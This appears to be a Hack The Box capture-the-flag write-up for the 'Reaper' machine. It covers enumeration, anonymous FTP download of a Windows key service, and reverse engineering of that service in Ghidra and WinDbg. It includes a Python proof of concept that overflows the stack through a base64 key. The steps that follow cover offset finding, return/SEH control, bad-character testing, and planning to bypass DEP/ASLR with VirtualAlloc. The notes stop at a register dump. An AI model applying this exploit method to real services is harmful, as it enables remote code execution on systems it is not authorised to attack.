https://app.hackthebox.com/machines/Reaper

![[Pasted_image_20251031132749.png]]

## Enumeration

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb]
└─$ nmap -A -Pn 10.129.234.200
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 13:25 PDT
Nmap scan report for 10.129.234.200
Host is up (0.17s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 08-15-23  12:12AM                  262 dev_keys.txt
|_08-14-23  02:53PM               187392 dev_keysvc.exe
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: REAPER
|   NetBIOS_Domain_Name: REAPER
|   NetBIOS_Computer_Name: REAPER
|   DNS_Domain_Name: reaper
|   DNS_Computer_Name: reaper
|   Product_Version: 10.0.19041
|_  System_Time: 2025-10-31T20:26:47+00:00
|_ssl-date: 2025-10-31T20:26:51+00:00; -4s from scanner time.
| ssl-cert: Subject: commonName=reaper
| Not valid before: 2025-10-30T20:18:22
|_Not valid after:  2026-05-01T20:18:22
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -4s, deviation: 0s, median: -4s

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   198.18 ms 10.10.16.1
2   198.32 ms 10.129.234.200

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.58 seconds
```

Nmap discovered an FTP service, and that service allows `Anonymous` authentication.   So I connect to it, authenticating with `Anonymous:<no password>`, switch to `binary` mode, and use `mget *` to download the files.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ ftp reaper.vl 21
Connected to reaper.vl.
220 Microsoft FTP Service
Name (reaper.vl:notroot): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||5001|)
125 Data connection already open; Transfer starting.
08-15-23  12:12AM                  262 dev_keys.txt
08-14-23  02:53PM               187392 dev_keysvc.exe
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> mget *
mget dev_keys.txt [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||5003|)
125 Data connection already open; Transfer starting.
100% |***************************************************************|   262        1.45 KiB/s    00:00 ETA
226 Transfer complete.
262 bytes received in 00:00 (0.92 KiB/s)
229 Entering Extended Passive Mode (|||5004|)
125 Data connection already open; Transfer starting.
100% |***************************************************************|   183 KiB  128.52 KiB/s    00:00 ETA
226 Transfer complete.
187392 bytes received in 00:01 (120.19 KiB/s)
ftp> exit
221 Goodbye.
```

Inside the `dev_keys.txt`:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ cat dev_keys.txt 
Development Keys:

100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl

The dev keys can not be activated yet, we are working on fixing a bug in the activation function.
```

It contains three UUID-like strings, each ending in what appears to be `base64`.   They translate to `Standard License` and `Premium License` respectively

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ file dev_keys.txt 
dev_keys.txt: ASCII text, with CRLF line terminators

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ dos2unix dev_keys.txt 
dos2unix: converting file dev_keys.txt to Unix format...

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ cat dev_keys.txt | grep -- - | cut -d '-' -f 6 | for b64 in $(cat -); do base64 -d <<<$b64 ; echo ""; done
Standard License
Premium License
Premium License
```

Running the application in my sandbox Windows VM, I found the application listens on port `4141`

```powershell
PS C:\reaper> .\dev_keysvc.exe
Server listening on port 4141
```

Confirmed by `nmap` on the `REAPER` host

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ nmap -sT -Pn reaper.vl -p 4141
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 21:53 PDT
Nmap scan report for reaper.vl (10.129.234.200)
Host is up (0.10s latency).

PORT     STATE SERVICE
4141/tcp open  oirtgsvc

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

`Ghidra` shows that the binary is a 64bit executable.  This is made obvious by the fact that the address size is 64, and the min/max address is in a range that is also only possible in a 64bit context.

![[Pasted_image_20251031220323.png]]

## Ghidra analysis

The entrypoint starts out by creating a stack cookie.  The only other function call is to `__scrt_common_main_seh()`

![[Pasted_image_20251031223630.png]]

### common_main_seh()
Once within this function, the function of interest is `FUN_140001bd0()`, which I have renamed to `bind_server` due to functions with ordinal numbers, which align to `ws2_32.dll`, and calls consistent with standing up a bind server.

![[Pasted_image_20251031225644.png]]

### bind_server()

A list of `ws2_32` ordinals: https://strontic.github.io/xcyclopedia/library/ws2_32.dll-9AB0235EC0B3AAC2A9E82C18B4677F89.html

The list is hard to digest due to sorting by function name.  It's easier to fix this by just copying them to a file, transforming it a bit, and sorting it by ordinal numerically, out to a csv format.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ cat ws2_32.ordinals.txt | sed -re 's/\t/,/g' -e 's/[ ]+/ /g' -e 's/ ,/,/g' | cut -d ',' -f 1,2 | awk -F ',' '{print $2","$1}' |sort -n > ordinals_ws2_32.csv
```

Then, I can just create an `sqlite` database, create a table for the data, and import it.

```sh
sqlite3 ws2_32.db
create table ws2_32 ( ordinal int32, name varchar[32] );
.mode csv
.import ordinals_ws2_32.csv ws2_32
```

Now in `bind_server()`:

![[Pasted_image_20251031230337.png]]

I am seeing calls to ordinals in the following order:
```
115
23
9
2
13
1
```

These translate to the following `ws2_32` function calls:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ for ordinal in 115 23 9 2 13 1; do sqlite3 ws2_32.db "select * from ws2_32 where ordinal == $ordinal"; done
115|WSAStartup
23|socket
9|htons
2|bind
13|listen
1|accept
```

Making it easier to visually follow once the references are renamed (a manual process but well worth it, wherever possible)

![[Pasted_image_20251031231057.png]]

But, it's really here within line 49 where we are interested.

![[Pasted_image_20251031231809.png]]

1. `FUN_14000ee50`: This function calls functions like `CreateThread`, `CloseHandle`, and `FreeLibrary` 
2. `FUN_140001000`:  This function calls `VirtualAlloc` twice, followed by `ws2_32` ordinals 19, 16, and 3

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ for ordinal in 19 16 3; do sqlite3 ws2_32.db "select * from ws2_32 where ordinal == $ordinal"; done
19|send
16|recv
3|closesocket
```

It is for that reason I have named the function `bind_client`.  This is a function well worth examining closely, as this is a function that handles user input.

### bind_client()

![[Pasted_image_20251109102039.png]]

We can see on line 24 and 25 above that there are two `VirtualAlloc`s that occur into local variables `local_48` and `local_40`.  Probably `recv` and `working_set` type buffers.  On line 27 it is shown a string, likely one that will be used in a prompt to select an option, either (1) `Set key` or (2) `Activate key`.  We enter into a `while` loop that is greater than what is displayed, and immediately enter into two more nested `while` loops.  This is where the string is sent to the user, and input is received by the user.  If the user input isn't "1", we break out of the third `while` loop, and nothing follows that `while` loop so we effectively break out of the second `while` loop as well.  

We can see that on line 35, the server `send`s "Enter a key: ",  then on line 38 we see a `recv` into `local_40` (that is the second `VirtualAlloc`), without a size.  Of note, the first argument is `local_50` (actually to all the `send` and `recv` calls, which means that is the client `sockfd`.  So lines 35 and 38 prompt the user for a key input.  Line 40 is a do-nothing.  

The function call on line 41 to `validate_key_format` is particularly interesting, it seems to process the supplied key by checking the key prefix and deeply nested function call to:

```c++
        bVar2 = __crt_stdio_input::format_string_parser<char>::advance
                          ((format_string_parser<char> *)(param_1 + 0x20));
```

But it is what occurs after the first `while` loop that is most interesting.

![[Pasted_image_20251109103106.png]]

The function call to `find_key` does things like open a file `keys.txt` for reading, and nested function call within it seems to do what appears to be base64 decoding (could be wrong), and some string comparison.

But it is the call to `case_exec` where the magic is at.  It is called with a pointer to the user-supplied buffer, null, and 0x1000 which I assume is a `maxlength`.

### case_exec

The `case_exec` function starts off with a rather long `switch`/`case` statement, longer than I could fit in a screenshot so I include the first part of it

![[Pasted_image_20251109103837.png]]

In order to trace with some dynamic analysis I rebase the application to 0x0, so I can use relative offsets in `windbg`.   For that, I open memory map in Ghidra, click the house icon, and rebase to 0x0.

![[Pasted_image_20251109104546.png]]

I use `windbg` to place a breakpoint at the call and step into it once the breakpoint is hit.  Here is what I use to handle lifecycle and breakpoint.

```sh
((cmd.exe /c "taskkill /F /IM dev_keysvc.exe" && timeout 1 && START /B "" "C:\reaper\dev_keysvc.exe" > c:\reaper\output.txt) || START /B "" "C:\reaper\dev_keysvc.exe" > c:\reaper\output.txt) && timeout 1 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe" -WF C:\windbg_custom.WEW -pn dev_keysvc.exe -c 'bp dev_keysvc+0x1116; g'
```

And I start with an initial buffer to try to reach the function.  Because the base64 will be longer than the input to it, and because upper bound is 0x1000, I use something a little smaller, like, 3000 bytes (`0xbb8`) instead of the full 4096.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ nc 192.168.56.100 4141 < <(echo -ne "1\n101-FE9A1-550-A271-0109-"$(perl -e 'printf "A"x0xbb8'|base64 -w0)"\n"; sleep 2; echo -ne "2\n"; sleep 2; echo -ne "3\n")
```

The function starts off with some function prologue followed by moving the base address into `r10`.

Shortly after, there is a comparison of `maxlen` (arg3) to `0xf`.  `0x1000` is obviously greater than this, so we would take this jump, which basically we skip the `switch`/`case` statement.

![[Pasted_image_20251109104931.png]]

Stepping through execution to the jump above instruction, that is exactly what happens.

![[Pasted_image_20251109105050.png]]

That brings us here:

![[Pasted_image_20251109105334.png]]


We can skip over the IF statement on line 73 because `maxlen` is `0x1000`, so we know `maxlen` can't be less than `0x21`.

We can also skip over the IF statement on line 79 because at the time we reach that comparison, the data region evaluates to 5.  Of interesting note is that there appears to be a function pointer exec on line 100, and things like this start to look relevant, interesting, and maybe even exciting.

A comparison statement on line 106 is what follows.

![[Pasted_image_20251109110513.png]]

If execution can enter the innermost IF statement visible in the screenshot above, `maxlen` is tested against `0x120` through `0x1ff` through a series of `case` statements.  There are other cases too like `0x100` and a `default` case, only the latter of which doesn't result in a `vmovntdq_avx`.  That instruction moves memory around in chunks of 256 bytes based on analysis.

But at the end of this operation there is another function pointer exec.

![[Pasted_image_20251109111014.png]]

Examining the code that is in fact exactly what happens

![[Pasted_image_20251109111336.png]]

If I set a breakpoint on this `jmp r11` instruction and continue (g), sure enough, that is where execution lands.

![[Pasted_image_20251109111639.png]]

But unfortunately, it appears we actually just jump to code that zeroes out the memory

```sh
0:003> u r11
dev_keysvc+0x32d1:
00007ff6`2c4232d1 c4a17e7f840920ffffff vmovdqu ymmword ptr [rcx+r9-0E0h],ymm0
00007ff6`2c4232db c4a17e7f840940ffffff vmovdqu ymmword ptr [rcx+r9-0C0h],ymm0
00007ff6`2c4232e5 c4a17e7f840960ffffff vmovdqu ymmword ptr [rcx+r9-0A0h],ymm0
00007ff6`2c4232ef c4a17e7f440980  vmovdqu ymmword ptr [rcx+r9-80h],ymm0
00007ff6`2c4232f6 c4a17e7f4409a0  vmovdqu ymmword ptr [rcx+r9-60h],ymm0
00007ff6`2c4232fd c4a17e7f4409c0  vmovdqu ymmword ptr [rcx+r9-40h],ymm0
00007ff6`2c423304 c4a17e7f4401e0  vmovdqu ymmword ptr [rcx+r8-20h],ymm0
00007ff6`2c42330b c5fe7f00        vmovdqu ymmword ptr [rax],ymm0
0:003> r ymm0
ymm0=           0            0            0            0            0            0            0            0
```


Based on what I understand so far, it seems we need to fill a buffer through Option 1, and we can cause arbitrary code execution through Option 2 so long as the key is found.

## Dynamic Analysis

If I run the application on my sandbox VM, it opens a port 4141.  If I connect to it using `netcat`, and try supplying one of the keys provided in `dev_keys.txt`, it says it couldn't find the key.

![[Pasted_image_20251101113232.png]]

The console output of the application server-side:

![[Pasted_image_20251101113453.png]]

The function `find_key` does make mention of `keys.txt`, but just to be sure where it expects it...

If I use Process Monitor from Sysinternals (https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), with the following filtering:
* process name contains 'dev_keysvc'

When I resend the same flow of requests (option 1, option 2), there is an attempt to `CreateFile`(handle) on a file `keys.txt` in the same working directory as the binary.

![[Pasted_image_20251101114028.png]]

So I'll create the file with the same contents as provided in the original `dev_keys.txt`:

```
100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl
```

After going through the same flow, the error output no longer occurs, but the application still sends back to the client "Could not find key!".

```
Checking key: 101-FE9A1-550-A271-0109, Comment: Premium License
Could not find key!
Choose an option:
1. Set key
2. Activate key
3. Exit
```

For this particular example, we need the 64bit `windbg`, and tailored to this application,  it would be:

```powershell
((cmd.exe /c "taskkill /F /IM dev_keysvc.exe" && timeout 3 && START /B "" "C:\reaper\dev_keysvc.exe" > c:\reaper\output.txt) || START /B "" "C:\reaper\dev_keysvc.exe" > c:\reaper\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe" -WF C:\windbg_custom.WEW -pn dev_keysvc.exe -c 'g'
```

The `-c` cmd specifies instructions to start with.  In this case I just want to attach to it and continue, and that way I can fuzz at it, to see if I can invoke a crash.

Other note, but it has to be started from a `cmd.exe`, powershell won't work here.

Basic send Options 1, 2, 3
```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ nc 192.168.56.100 4141 < <(echo -ne "1\n101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl\n"; sleep 2; echo -ne "2\n"; sleep 2; echo -ne "3\n")
Choose an option:
1. Set key
2. Activate key
3. Exit
Enter a key: Valid key format
Choose an option:
4. Set key
5. Activate key
6. Exit
Checking key: 101-FE9A1-550-A271-0109, Comment: Premium License
Could not find key!
Choose an option:
7. Set key
8. Activate key
9. Exit
```

When I attach to `dev_keysvc.exe` using `windbg`, the process is loaded into a memory range that differs from the AddressOfEntryPoint field in the PE header.

```
ModLoad: 00007ff7`66a80000 00007ff7`66ab3000   C:\reaper\dev_keysvc.exe
```

Obviously my `Ghidra` analysis will need to be rebased to this range.  That is done by opening Alt+W (window), selecting Memory Map, and selecting the Home icon.

![[Pasted_image_20251101154640.png]]

Afterward all of the addressing will match up with `windbg`.  I need to break at the function call to `find_key`

![[Pasted_image_20251101160445.png]]

After rebase, it is at `7ff766a811ca`

![[Pasted_image_20251101160555.png]]

### Fuzzing for a controllable crash

I am able to select option 1, send the key, select option 2, and select option three with the following basic python 

```python
def main():
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} ip:port <optional>")
        sys.exit()
    else:
        ip, port = sys.argv[1].split(":")
        port = int(port)
        sock = cx(ip,port,0)


    numeral = int(sys.argv[2])
    pay = (base64.b64encode(bytearray("A"*numeral,'latin-1'))).decode('latin-1')
    bufs = ["1\n", f"110-FE9A1-550-A271-0109-{pay}\n", "2\n", "3\n"]
    
    for x in range(0,len(bufs)):
	    ## recv from server
        print(sock.recv(4096))
        ## print first 32 bytes of what will be sent
        print(f"{bufs[x][:32].replace((b'\x0a').decode('latin-1'),r'\\n')}[...]")
        ## send to server
        sock.send(bufs[x].encode('latin-1'))
```

If I set a breakpoint at the call to `find_key`, after I send a buffer of 3000 As:

The breakpoint is hit

```
Breakpoint 0 hit
dev_keysvc+0x11ca:
00007ff7`66a811ca e841070000      call    dev_keysvc+0x1910 (00007ff7`66a81910)
```


![[Pasted_image_20251101182531.png]]

Looking at the exception chain, it is already overflowed by the buffer.

![[Pasted_image_20251101182803.png]]

For reference, this crash occured with an input buffer (before base64) of just 3000 bytes.  Obviously these 3000 bytes get base64'd and appended to the beginning of the key.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ ./poc.py 192.168.56.100:4141 3000

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ cat poc.py | awk -v RS="" '/bufs/' 
    numeral = int(sys.argv[2])
    pay = (base64.b64encode(bytearray("A"*numeral,'latin-1'))).decode('latin-1')
    bufs = ["1\n", f"110-FE9A1-550-A271-0109-{pay}\n", "2\n", "3\n"]
    for x in range(0,len(bufs)):
        print(sock.recv(4096))
        print(f"{bufs[x][:32].replace((b'\x0a').decode('latin-1'),r'\\n')}[...]")
        sock.send(bufs[x].encode('latin-1'))
```

Call stack with emphasis on exception-related information

```
0:003> kb e
 # RetAddr               : Args to Child                                                           : Call Site
00 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : dev_keysvc+0x16f1
01 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
02 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
03 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
04 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
```


### Triangulating a pattern

If I re-run this same excercise, but instead of 3000 As I pass a pattern string of length 3000:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ ./poc.py 192.168.56.100:4141 $(msf-pattern_create 64 -l 3000)

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ cat poc.py | awk -v RS="" '/bufs/' 
    
    pattern = sys.argv[2]
    pay = (base64.b64encode(bytearray(pattern,'latin-1'))).decode('latin-1')
    bufs = ["1\n", f"110-FE9A1-550-A271-0109-{pay}\n", "2\n", "3\n"]
    for x in range(0,len(bufs)):
        print(sock.recv(4096))
        print(f"{bufs[x][:32].replace((b'\x0a').decode('latin-1'),r'\\n')}[...]")
        sock.send(bufs[x].encode('latin-1'))
```

The pattern appears:

```sh
00007ff7`66a81937 e874fcffff      call    dev_keysvc+0x15b0 (00007ff7`66a815b0)
0:003> p
(136c.e0c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
dev_keysvc+0x16f1:
00007ff7`66a816f1 c3              ret
0:003> !exchain
100 stack frames, scanning for handlers...
Frame 0x01: error getting module for 3164413064413963
Frame 0x02: error getting module for 6441336441326441
Frame 0x03: error getting module for 4136644135644134
Frame 0x04: error getting module for 3964413864413764

[...]

0:003> kb e
 # RetAddr               : Args to Child                                                           : Call Site
00 31644130`64413963     : 64413364`41326441 41366441`35644134 39644138`64413764 65413165`41306541 : dev_keysvc+0x16f1
01 64413364`41326441     : 41366441`35644134 39644138`64413764 65413165`41306541 41346541`33654132 : 0x31644130`64413963
02 41366441`35644134     : 39644138`64413764 65413165`41306541 41346541`33654132 37654136`65413565 : 0x64413364`41326441
03 39644138`64413764     : 65413165`41306541 41346541`33654132 37654136`65413565 66413965`41386541 : 0x41366441`35644134

```

Exact match at 88 bytes in.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ msf-pattern_offset 64 -l 3000 -q 3164413064413963
[*] Exact match at offset 88
```

### Controlling SEH

After refactoring for controlling SEH, 

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ ./poc.py 192.168.56.100:4141

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ cat poc.py | awk -v RS="" '/bufs/' 
    
    crash=3000
    crashlen=88
    onramp=("\x41")*crashlen
    SEH=("\x42"*8)
    offramp= ("\x43" * (crash - sum([len(x) for x in [
        onramp,
        SEH
    ]])))
    compiled_payload = f"{onramp}{SEH}{offramp}"
    pay = (base64.b64encode(bytearray(compiled_payload,'latin-1'))).decode('latin-1')
    bufs = ["1\n", f"110-FE9A1-550-A271-0109-{pay}\n", "2\n", "3\n"]
    for x in range(0,len(bufs)):
        print(sock.recv(4096))
        print(f"{bufs[x][:32].replace((b'\x0a').decode('latin-1'),r'\\n')}[...]")
        sock.send(bufs[x].encode('latin-1'))
        
```

SEH is controlled

```
00007ff7`66a81937 e874fcffff      call    dev_keysvc+0x15b0 (00007ff7`66a815b0)
0:001> p
(2110.1378): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
dev_keysvc+0x16f1:
00007ff7`66a816f1 c3              ret
0:001> !exchain
100 stack frames, scanning for handlers...
Frame 0x01: error getting module for 4242424242424242
Frame 0x02: error getting module for 4343434343434343
Frame 0x03: error getting module for 4343434343434343
Frame 0x04: error getting module for 4343434343434343

[...]

0:001> kb e
 # RetAddr               : Args to Child                                                           : Call Site
00 42424242`42424242     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : dev_keysvc+0x16f1
01 43434343`43434343     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : 0x42424242`42424242
02 43434343`43434343     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : 0x43434343`43434343
03 43434343`43434343     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : 0x43434343`43434343
```

### Identifying bad characters

I have a function I created for this, `gen_badchars`.  It will create a string containing all bytes sequentially between a start and end range, then filter out any that are passed as first argument.

```python
badchars = ""
def gen_badchars(bc, start="\x01", end="\xff"):
	s_int = ord(start)
	e_int = ord(end)+1
	BC = bytearray(range(s_int,e_int)).decode('latin-1')
	for item in bc:
		BC = BC.replace(item,'')
	return BC
```

I'll start with the full range of bytes between 0x00 and 0xFF.   As bad characters are identified, I can add them to the variable `badchars`, which gets passed as the first argument.

```python
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ cat poc.py | awk -v RS="" '/bufs/' 
    
    crash=3000
    crashlen=88
    onramp=("\x41")*crashlen
    SEH=("\x42"*8)
    bad = gen_badchars(badchars,start="\x00",end="\xff")   #<-----
    offramp= ("\x43" * (crash - sum([len(x) for x in [
        onramp,
        SEH,
        bad     #<-----
    ]])))
    compiled_payload = f"{onramp}{SEH}{bad}{offramp}"   #<------
    pay = (base64.b64encode(bytearray(compiled_payload,'latin-1'))).decode('latin-1')
    bufs = ["1\n", f"110-FE9A1-550-A271-0109-{pay}\n", "2\n", "3\n"]
    for x in range(0,len(bufs)):
        print(sock.recv(4096))
        print(f"{bufs[x][:32].replace((b'\x0a').decode('latin-1'),r'\\n')}[...]")
        sock.send(bufs[x].encode('latin-1'))

```

When I resend, I find there are no bad characters

```sh
0:003> db rsp L0xFF+9
000000d2`a29fe908  42 42 42 42 42 42 42 42-00 01 02 03 04 05 06 07  BBBBBBBB........
000000d2`a29fe918  08 09 0a 0b 0c 0d 0e 0f-10 11 12 13 14 15 16 17  ................
000000d2`a29fe928  18 19 1a 1b 1c 1d 1e 1f-20 21 22 23 24 25 26 27  ........ !"#$%&'
000000d2`a29fe938  28 29 2a 2b 2c 2d 2e 2f-30 31 32 33 34 35 36 37  ()*+,-./01234567
000000d2`a29fe948  38 39 3a 3b 3c 3d 3e 3f-40 41 42 43 44 45 46 47  89:;<=>?@ABCDEFG
000000d2`a29fe958  48 49 4a 4b 4c 4d 4e 4f-50 51 52 53 54 55 56 57  HIJKLMNOPQRSTUVW
000000d2`a29fe968  58 59 5a 5b 5c 5d 5e 5f-60 61 62 63 64 65 66 67  XYZ[\]^_`abcdefg
000000d2`a29fe978  68 69 6a 6b 6c 6d 6e 6f-70 71 72 73 74 75 76 77  hijklmnopqrstuvw
000000d2`a29fe988  78 79 7a 7b 7c 7d 7e 7f-80 81 82 83 84 85 86 87  xyz{|}~.........
000000d2`a29fe998  88 89 8a 8b 8c 8d 8e 8f-90 91 92 93 94 95 96 97  ................
000000d2`a29fe9a8  98 99 9a 9b 9c 9d 9e 9f-a0 a1 a2 a3 a4 a5 a6 a7  ................
000000d2`a29fe9b8  a8 a9 aa ab ac ad ae af-b0 b1 b2 b3 b4 b5 b6 b7  ................
000000d2`a29fe9c8  b8 b9 ba bb bc bd be bf-c0 c1 c2 c3 c4 c5 c6 c7  ................
000000d2`a29fe9d8  c8 c9 ca cb cc cd ce cf-d0 d1 d2 d3 d4 d5 d6 d7  ................
000000d2`a29fe9e8  d8 d9 da db dc dd de df-e0 e1 e2 e3 e4 e5 e6 e7  ................
000000d2`a29fe9f8  e8 e9 ea eb ec ed ee ef-f0 f1 f2 f3 f4 f5 f6 f7  ................
000000d2`a29fea08  f8 f9 fa fb fc fd fe ff
```

### Easy so far, what's the catch?

This is slightly unsettling to me, because this machine is supposed to be an `INSANE` level machine, but crash + control SEH + badchars, pretty standard stuff so far, maybe even too easy.  So what's the catch?

And then it occurred to me, to check on loaded process and module protections

```sh
0:003> !load narly

      __s|I}*!{a.                        ._s,aan2*a
     _wY1+~-    )S,                     .ae"~=:...:X
   .vXl+:.       -4c                   <2+=|==::..:d
   vvi=;..        -?o,                =2=+==:::...=d
  )nv=:.            )5,              .2=--.......-=d
  ue+::              -*s             <c .        .=d
  m>==::..     ._,     <s,           )c           :d
  #==viii|===; {Xs=,    -{s          )c         ..:d
  Z;{nnonnvvii;v(-{%=.    ~s,        )e:====||iiv%=d
  X={oooonvvIl;3;  -{%,    -*>       )2<onnnnvnnnn>d
  X=)vvvvIliii:3;    -!s.   :)s.     )e<oonvlllllIid
  X=<lllliii|=:n;      -1c.  +|1,    )z<nvii||+|+|vX
  S=<lli|||=:: n;        "nc  -s%;   )c=ovl|++==+=vo
  X=<i||+=; . .n`          "1>.-{%i. )c<Xnnli||++=vn
  X=iii>==-.  :o`            "1,:+iI,)c:Sonnvli||=v(
  X>{ii+;:-  .u(               "o,-{Iw(:nvvvllii=v2
  S=i||;:. .=u(                 -!o,+I(:iiillii|ie`
  2>v|==__su?`                    -?o,-:==||iisv"
  {nvnI!""~                         -!sasvv}""`

             by Nephi Johnson (d0c_s4vage)
                      N for gnarly!

Available commands:

    !nmod     - display /SafeSEH, /GS, DEP, and ASLR info for
                all loaded modules

0:003> !nmod
66a80000 66ab3000 dev_keysvc           /SafeSEH OFF     *ASLR *DEP C:\reaper\dev_keysvc.exe
4a170000 4a182000 kernel_appcore       /SafeSEH OFF     *ASLR *DEP C:\Windows\SYSTEM32\kernel.appcore.dll
4b9b0000 4ba1a000 mswsock              /SafeSEH OFF     *ASLR *DEP C:\Windows\system32\mswsock.dll
4c5e0000 4c8d6000 KERNELBASE           /SafeSEH OFF     *ASLR *DEP C:\Windows\System32\KERNELBASE.dll
4cc90000 4cd2e000 msvcrt               /SafeSEH OFF     *ASLR *DEP C:\Windows\System32\msvcrt.dll
4d580000 4d6a0000 RPCRT4               /SafeSEH OFF     *ASLR *DEP C:\Windows\System32\RPCRT4.dll
4e0c0000 4e12b000 WS2_32               /SafeSEH OFF     *ASLR *DEP C:\Windows\System32\WS2_32.dll
4e130000 4e1f2000 KERNEL32             /SafeSEH OFF     *ASLR *DEP C:\Windows\System32\KERNEL32.DLL
4ec70000 4ee68000 ntdll                /SafeSEH OFF     *ASLR *DEP C:\Windows\SYSTEM32\ntdll.dll

*DEP/*ASLR means that these modules are compatible with ASLR/DEP

```

And there it is.  DEP and ASLR are enabled.  In fact, there is nothing loaded where it isn't, so only way to win is by ROPchain to bypass DEP, and because of the latter I will need a memory leak to bypass ASLR.

Seeing as how we know where and how to get to the crash, we can use the following argument to `windbg` to fastforward to raised exception.  We set a breakpoint at the function that, if we pass over it, catches exception.

```
 -c 'bp 0x7ff766a81937; g; p; !exchain L0x4' 
```

One other consideration is what method to employ, and for that I found that really the only method of interest imported by `dev_keysvc.exe` is  `VirtualAlloc` that might be used for this.  We might be able to use `VirtualAlloc` in much the same way as `VirtualProtect`,  and here is how.

https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc

VirtualAlloc:

```c
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

"Reserves, commits, or __changes__ the state of a region of pages in the virtual address space of the calling process. Memory allocated by this function is automatically initialized to zero. "

However memory already reserved and committed can have its memory protections changed/updated, if we supply `flProtect` with a value of **MEM_COMMIT** (`0x00001000`), we can supply an `flAllocationType` of  **PAGE_EXECUTE_READWRITE** (`0x40`) https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants.  

In this way we can effectively perform a `VirtualProtect` without `VirtualProtect`, on an existing memory region.

And then there's the matter of ASLR.  Only rational way to bypass that is to find some type of leak of an address of one of the modules, or the binary itself, at runtime.  That way ROP gadgets can use realtive addressing added to a base address.

Registers at time of crash:

```
0:003> r
rax=00000000ffffffff rbx=000001e554b7bc60 rcx=4a4db4eaa5a70000
